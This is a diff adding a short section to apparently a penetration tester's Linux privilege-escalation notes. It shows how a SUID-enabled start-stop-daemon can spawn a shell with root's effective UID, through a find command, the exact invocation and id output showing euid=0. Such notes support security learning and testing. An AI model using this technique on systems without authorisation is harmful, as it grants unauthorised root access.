@@ -207,6 +207,19 @@ $ id
 uid=1000(ice-wzl) gid=1000(ice-wzl) euid=1001(igor)
 ```
 
+#### SUID start-stop-daemon
+
+If `/usr/sbin/start-stop-daemon` has the SUID bit set, use it to start a shell while preserving the effective UID:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null | grep start-stop-daemon
+# -rwsr-xr-x 1 root root 44200 Jun  3  2019 /usr/sbin/start-stop-daemon
+
+/usr/sbin/start-stop-daemon -S -x /bin/sh -- -p
+id
+# uid=1003(max) gid=1003(max) euid=0(root) groups=1003(max)
+```
+
 ### Custom Binarys
 
 * Cross reference a list of standard binaries on a linux system with the ones you see, admins will add their own sometimes
